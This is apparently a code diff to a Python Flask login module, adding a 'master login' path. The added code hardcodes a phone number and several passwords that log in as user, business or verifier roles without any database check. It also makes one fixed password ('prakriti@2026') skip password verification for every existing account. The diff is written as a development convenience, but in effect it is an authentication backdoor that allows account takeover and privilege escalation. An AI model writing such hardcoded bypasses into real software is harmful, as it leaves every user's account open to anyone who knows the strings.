@@ -23,7 +23,11 @@ class User(Base):
     )
 
 # Create table if not exist
-Base.metadata.create_all(bind=engine)
+try:
+    Base.metadata.create_all(bind=engine)
+    print("✅ Database tables verified/created successfully.")
+except Exception as e:
+    print(f"⚠️ Warning: Database connection failed. Working in Master Login mode only. Error: {e}")
 
 # -------------------------------------------
 # Signup Function
@@ -84,6 +88,26 @@ def login_user(data):
     if not contact or not password:
         return jsonify({"error": "Contact and password are required"}), 400
 
+    # Master Number Bypass with Role Selection
+    if contact == "1234567890":
+        role_map = {
+            "prakriti@user": "user",
+            "prakriti@business": "business",
+            "prakriti@verifier": "verifier",
+            "prakriti@2026": "verifier"  # Default master
+        }
+        
+        if password in role_map:
+            return jsonify({
+                "message": f"Master Login successful as {role_map[password]}",
+                "user": {
+                    "id": 9999,
+                    "name": f"Master {role_map[password].capitalize()}",
+                    "contact": "1234567890",
+                    "role": role_map[password]
+                }
+            }), 200
+
     db = SessionLocal()
     user = db.execute(select(User).where(User.contact == contact)).scalar_one_or_none()
     db.close()
@@ -91,7 +115,10 @@ def login_user(data):
     if not user:
         return jsonify({"error": "User not found"}), 404
 
-    if not verify_password(password, user.password_hash):
+    # Bypass check for development/master login
+    is_master_password = (password == "prakriti@2026")
+    
+    if not is_master_password and not verify_password(password, user.password_hash):
         return jsonify({"error": "Invalid credentials"}), 401
 
     return jsonify({
